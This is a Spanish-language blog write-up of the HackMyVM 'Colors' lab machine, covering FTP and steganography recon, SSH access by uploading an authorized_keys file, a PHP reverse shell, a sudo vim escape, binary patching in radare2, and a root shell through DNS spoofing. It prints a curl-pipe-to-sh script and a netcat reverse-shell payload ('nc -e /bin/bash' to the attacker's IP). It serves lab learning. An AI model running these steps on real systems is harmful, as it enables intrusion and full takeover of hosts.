<!DOCTYPE html>
<html lang="es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackMyVM - Colors | noname</title>
<meta property="og:title" content="HackMyVM - Colors | noname" />
<meta name="twitter:title" content="HackMyVM - Colors | noname" />
<meta itemprop="name" content="HackMyVM - Colors | noname" />
<meta name="application-name" content="HackMyVM - Colors | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="">
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hmv/colors/" title="" />



  <meta itemprop="image" content="http://localhost:1313/" />
  <meta property="og:image" content="http://localhost:1313/" />
  <meta name="twitter:image" content="http://localhost:1313/" />
  <meta name="twitter:image:src" content="http://localhost:1313/" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-02-26T19:20:23&#43;0200 />
    <meta property="article:published_time" content=2023-02-26T19:20:23&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackMyVM - Colors",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-02-26",
        "description": "",
        "wordCount":  1369 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-02-26",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>

<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="http://localhost:1313/writeups/hmv/colors/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    </head>
<body data-theme = "" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackMyVM - Colors</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-02-26T19:20:23&#43;02:00" itemprop="datePublished"> Feb 26, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/hmv/colors/colors-logo.png" alt="logo"></p>
<ul>
<li><em>IPv6</em></li>
<li><em>sudo abuse</em></li>
<li><em>Reversing</em></li>
<li><em>DNS Spoofing</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -v -n --open 10.10.1.49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp open  ftp
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">nmap -sVC -p 21,80 10.10.1.49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">/tcp open  ftp     vsftpd 3.0.3
</span></span><span class="line"><span class="cl">ftp-syst: 
</span></span><span class="line"><span class="cl">  STAT: 
</span></span><span class="line"><span class="cl">FTP server status:
</span></span><span class="line"><span class="cl">     Connected to ::ffff:10.10.1.40
</span></span><span class="line"><span class="cl">     Logged in as ftp
</span></span><span class="line"><span class="cl">     TYPE: ASCII
</span></span><span class="line"><span class="cl">     No session bandwidth limit
</span></span><span class="line"><span class="cl">     Session timeout in seconds is 300
</span></span><span class="line"><span class="cl">     Control connection is plain text
</span></span><span class="line"><span class="cl">     Data connections will be plain text
</span></span><span class="line"><span class="cl">     At session startup, client count was 6
</span></span><span class="line"><span class="cl">     vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class="line"><span class="cl">End of status
</span></span><span class="line"><span class="cl">ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1127     1127            0 Jan 27 22:45 first
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1039     1039            0 Jan 27 22:45 second
</span></span><span class="line"><span class="cl">-rw-r--r--    1 0        0          290187 Feb 11 16:35 secret.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1081     1081            0 Jan 27 22:45 third
</span></span><span class="line"><span class="cl">/tcp open  http    Apache httpd 2.4.54 ((Debian))
</span></span><span class="line"><span class="cl">http-title: Document
</span></span><span class="line"><span class="cl">http-server-header: Apache/2.4.54 (Debian)
</span></span><span class="line"><span class="cl">Service Info: OS: Unix
</span></span></code></pre></div><p>Me conecto al FTP y descargo <code>secret.jpg</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ftp 10.10.1.49
</span></span><span class="line"><span class="cl">ftp&gt; ls -la
</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
</span></span><span class="line"><span class="cl">drwxr-xr-x    2 0        0            4096 Feb 20 15:59 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    2 0        0            4096 Feb 20 15:59 ..
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1127     1127            0 Jan 27 22:45 first
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1039     1039            0 Jan 27 22:45 second
</span></span><span class="line"><span class="cl">-rw-r--r--    1 0        0          290187 Feb 11 16:35 secret.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1081     1081            0 Jan 27 22:45 third
</span></span><span class="line"><span class="cl">ftp&gt; get secret.txt
</span></span></code></pre></div><p>Uso la herramienta <code>steegseek</code> y encuentro un archivo de texto con el nombre <code>secret.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ stegseek secret.jpg                
</span></span><span class="line"><span class="cl">[i] Found passphrase: &#34;Nevermind&#34;
</span></span><span class="line"><span class="cl">[i] Original filename: &#34;more_secret.txt&#34;.
</span></span><span class="line"><span class="cl">[i] Extracting to &#34;secret.jpg.out&#34;.
</span></span></code></pre></div><p>Contenido archivo <code>secret.jpg.out</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&lt;-MnkFEo!SARTV#+D,Y4D&#39;3_7G9D0LFWbmBCht5&#39;AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)&lt;BOr&lt;.BPD?sF!,R&lt;@&lt;&lt;W;Dfm15Bk2*/F&lt;G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0&gt;E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@&lt;iu-Ec5e;FD,5.F(&amp;Zl+D&gt;2(@W-9&gt;+@BRZ@q[!,BOr&lt;.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`&#39;O.CG^*/BkJ\:
</span></span></code></pre></div><p>Está codificado en <code>base85</code>, una vez decodificado obtengo en siguiente mensaje y unas credenciales al final.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Twenty years from now you will be more disappointed by the things that you didn&#39;t do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.pink:Pink4sPig$$.
</span></span></code></pre></div><p>Me conecto al <code>FTP</code> de nuevo con el usuario pink.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl">200 PORT command successful. Consider using PASV.
</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
</span></span><span class="line"><span class="cl">drwx------    2 1127     1127         4096 Feb 11 19:55 green
</span></span><span class="line"><span class="cl">drwx------    3 1000     1000         4096 Feb 11 19:18 pink
</span></span><span class="line"><span class="cl">drwx------    2 1081     1081         4096 Feb 20 16:07 purple
</span></span><span class="line"><span class="cl">drwx------    2 1039     1039         4096 Feb 11 19:56 red
</span></span></code></pre></div><p>Entro en la carpeta <code>pink</code> por que en las demás carpetas no tenemos permiso.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">drwx------    3 1000     1000         4096 Feb 11 19:18 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    6 0        0            4096 Jan 27 22:44 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx    1 1000     1000            9 Jan 27 20:30 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rwx------    1 1000     1000          220 Jan 27 20:22 .bash_logout
</span></span><span class="line"><span class="cl">-rwx------    1 1000     1000         3526 Jan 27 20:22 .bashrc
</span></span><span class="line"><span class="cl">-rwx------    1 1000     1000          807 Jan 27 20:22 .profile
</span></span><span class="line"><span class="cl">drwx------    2 1000     1000         4096 Feb 11 19:55 .ssh
</span></span><span class="line"><span class="cl">-rwx------    1 1000     1000         3705 Feb 11 19:18 .viminfo
</span></span><span class="line"><span class="cl">-rw-r--r--    1 1000     1000           23 Feb 11 16:59 note.txt
</span></span></code></pre></div><p>Me llama la atención la carpeta.ssh porque en el reconocimiento de puertos no me detectó el puerto 22. Así que vuelvo a escanear los puertos sin la flag <code>--open</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -v -n 10.10.1.49
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE
</span></span><span class="line"><span class="cl">21/tcp open     ftp
</span></span><span class="line"><span class="cl">22/tcp filtered ssh
</span></span><span class="line"><span class="cl">80/tcp open     http
</span></span></code></pre></div><p>Encuentra el puerto 22 filtrado, está filtrado para <code>IPv4</code> lo podemos abrir mediante la técnica de <code>Port Knocking</code> pero en este writeup accederé al sistema por <code>IPv6</code>. Hago un barrido con <code>ping6</code> en busca de direcciones <code>IPv6</code> y encuentro la siguiente dirección:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ping6 -c2 -n -I enp0s3 ff02::1
</span></span><span class="line"><span class="cl">64 bytes from fe80::a00:27ff:fe06:f767%enp0s3: icmp_seq=1 ttl=64 time=0.607 ms
</span></span></code></pre></div><p>Antes de conectarme por ssh, he creado un archivo <code>authorized_keys</code>, dentro del archivo he copiado mi <code>id_rsa.pub</code> de mi máquina y luego lo he subido a la carpeta <code>.ssh</code> del usuario pink a través del servidor ftp
Me conecto al sistema a través del servicio SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ssh -6 pink@fe80::a00:27ff:fe06:f767%enp0s3
</span></span><span class="line"><span class="cl">pink@color:~$ id
</span></span><span class="line"><span class="cl">uid=1000(pink) gid=1000(pink) groups=1000(pink),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
</span></span></code></pre></div><p>Leyendo el archivo <code>.viminfo</code>
observo que ha habido movimiento en la ruta <code>/var/www/html</code> me desplazo a ella observo que puedo crear archivos, creo un archivo php malicioso para obtener una shell.    <a href="http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz">Descargar shell</a></p>
<p>Uso curl para mandar una petición a la shell que he subido anteriormente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s 10.10.1.49/noname.php
</span></span></code></pre></div><p>Obtengo una shell como usuario <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvp 1337
</span></span><span class="line"><span class="cl">listening on [any] 1337 ...
</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class="line"><span class="cl">pink     pts/0    fe80::a999:aaa9: 15:55   45.00s  0.03s  0.03s -bash
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span><span class="line"><span class="cl">/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class="line"><span class="cl">$ id
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>Después de hacer un tratamiento para la tty lanzo un sudo -l.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@color:/home$ sudo -l
</span></span><span class="line"><span class="cl">User www-data may run the following commands on color:
</span></span><span class="line"><span class="cl">    (green) NOPASSWD: /usr/bin/vim
</span></span></code></pre></div><p>Para pivotar del usuario www-data al usuario green he usado el recurso gtfobins:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo -u green vim -c &#39;:!/bin/bash&#39;
</span></span></code></pre></div><p>Como usuario green lanzo de nuevo un ls y luego un cat al fichero note.txt.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">green@color:~$ ls -la
</span></span><span class="line"><span class="cl">total 44
</span></span><span class="line"><span class="cl">drwx------ 2 green green  4096 Feb 11 19:55 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 6 root  root   4096 Jan 27 22:44 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root  root      9 Feb 11 19:55 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rwx------ 1 green green   220 Jan 27 22:44 .bash_logout
</span></span><span class="line"><span class="cl">-rwx------ 1 green green  3526 Jan 27 22:44 .bashrc
</span></span><span class="line"><span class="cl">-rwx------ 1 green green   807 Jan 27 22:44 .profile
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root  root    145 Feb 11 16:42 note.txt
</span></span><span class="line"><span class="cl">-rwxr-xr-x 1 root  root  16928 Feb 11 19:29 test_4_green
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">green@color:~$ cat note.txt 
</span></span><span class="line"><span class="cl">You&#39;ve been working very well lately Green, so I&#39;m going to give you one ltest. If you pass it I&#39;ll give you the password for purple.
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">-root
</span></span></code></pre></div><p>Lanzo test_4_all para ver de que se trata.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">green@color:~$ ./test_4_green
</span></span><span class="line"><span class="cl">Guess the number im thinking: 1337
</span></span><span class="line"><span class="cl">Nope, sorry
</span></span></code></pre></div><p>Tenemos que adivinar el número para que nos de la contraseña de purple, para ello usaré radare para analizar el binario y parchear la zona donde nos pide que introduzcamos un número para que al poner cualquier número lo acepte como válido y nos muestre la contraseña para purple.</p>
<p>Abro el binario con permisos de escritura.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ r2 -w ./test_4_green
</span></span></code></pre></div><p>Pulso <code>V</code> y depués enter.</p>
<p><img src="/../machines/hmv/colors/r2V.png" alt="img"></p>
<p>Nos muestra lo siguiente.</p>
<p><img src="/../machines/hmv/colors/r2V2.png" alt="img"></p>
<p>Pulso <code>p</code> y después enter.</p>
<p><img src="/../machines/hmv/colors/r2P.png" alt="img"></p>
<p>Se puede observar que hay unas cadenas de texto entendibles para humanos.</p>
<p><img src="/../machines/hmv/colors/r2P1.png" alt="img"></p>
<p><img src="/../machines/hmv/colors/r2P2.png" alt="img"></p>
<p>Con las flechas &ldquo;arriba y abajo&rdquo; nos movemos hasta la dirección <code>0x00001257</code> es importante que la dirección <code>0x00001257</code> esté marcada en amarillo como se ve en la imagen en el &ldquo;recuadro&rdquo; amarillo.</p>
<p><img src="/../machines/hmv/colors/r2P3_2.png" alt="img"></p>
<p>Pulso <code>shift+a</code> y escribo <code>je 0x12cb</code>.</p>
<p><img src="/../machines/hmv/colors/r2A.png" alt="img"></p>
<p>Pulso enter, guardo cambios con <code>Y</code>.</p>
<p><img src="/../machines/hmv/colors/r2Asavey.png" alt="img"></p>
<p>Para salir del programa: <code>q</code>, <code>q</code>, enter.
Lanzo <code>./test_4_all</code> y le pongo cualquier número.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ./test_4_green
</span></span><span class="line"><span class="cl">Guess the number im thinking: 12
</span></span><span class="line"><span class="cl">Correct!! Here is the pass:
</span></span><span class="line"><span class="cl">p************
</span></span></code></pre></div><p>Archivo <code>for_purple_only</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">purple@color:~$ cat for_purple_only.txt 
</span></span><span class="line"><span class="cl">As the highest level user I allow you to use the supreme ddos attack script.
</span></span></code></pre></div><p>El usuario purple puede ejecutar <code>/attack/ddos.sh</code> como root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">purple@color:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for purple on color:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">User purple may run the following commands on color:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /attack_dir/ddos.sh
</span></span></code></pre></div><p>El archivo <code>ddos.sh</code> hace una petición con curl al dominio <code>masterddos.hmv</code> y luego lanza <code>attack.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"> #!/bin/bash
</span></span><span class="line"><span class="cl">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p
</span></span></code></pre></div><h3 id="r00t">r00t</h3>
<p>Mediante la técnica <code>DNS Spoofing</code> simularé ser el dominio <code>masterddos.hmv</code> para que el archivo <code>ddos.sh</code> funcione correctamente y nos devuelva una shell.
Con <code>ettercap</code> se puede hacer <code>DNS Spoofing</code> y hay mucha información de como se configura para realizar el ataque con lo cual me saltaré estos pasos.</p>
<p>En la máquina atacante, creo el archivo <code>attack.sh</code> en <code>/var/www/html</code> y le pongo un netcat apuntando a mi dirección ip.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">#!/bin/bash
</span></span><span class="line"><span class="cl">nc -e /bin/bash 10.10.1.40 4444
</span></span></code></pre></div><p>Levanto el servicio apache, dejo un listener con el puerto 4444 a la escucha, inicio el DNS Spoofing con ettercap y finalmente lanzo el script ddos.sh.</p>
<p><img src="/../machines/hmv/colors/ettercapG.png" alt="img"></p>
<p>Obtengo la shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvp 4444
</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
</span></span><span class="line"><span class="cl">10.10.1.49: inverse host lookup failed: Unknown host
</span></span><span class="line"><span class="cl">connect to [10.10.1.40] from (UNKNOWN) [10.10.1.49] 33018
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></div><p>Flag de root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">root@color:~# cat root.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I hope you liked it :)
</span></span><span class="line"><span class="cl">    Here, some chocolate and the flag:
</span></span><span class="line"><span class="cl">    (:go_****_****_*********:)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">     ___  ___  ___  ___  ___.---------------.
</span></span><span class="line"><span class="cl">      .&#39;\__\&#39;\__\&#39;\__\&#39;\__\&#39;\__,`   .  ____ ___ \
</span></span><span class="line"><span class="cl">      |\/ __\/ __\/ __\/ __\/ _:\   |:.  \  \___ \
</span></span><span class="line"><span class="cl">       \\&#39;\__\&#39;\__\&#39;\__\&#39;\__\&#39;\_`.__|  `. \  \___ \
</span></span><span class="line"><span class="cl">        \\/ __\/ __\/ __\/ __\/ __:                \
</span></span><span class="line"><span class="cl">         \\&#39;\__\&#39;\__\&#39;\__\ \__\&#39;\_;-----------------`
</span></span><span class="line"><span class="cl">          \\/   \/   \/   \/   \/ :                 |
</span></span><span class="line"><span class="cl">           \|______________________;________________|
</span></span></code></pre></div><p>Y aquí termina Colors la primera y maravillosa máquina del sr Pablo.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
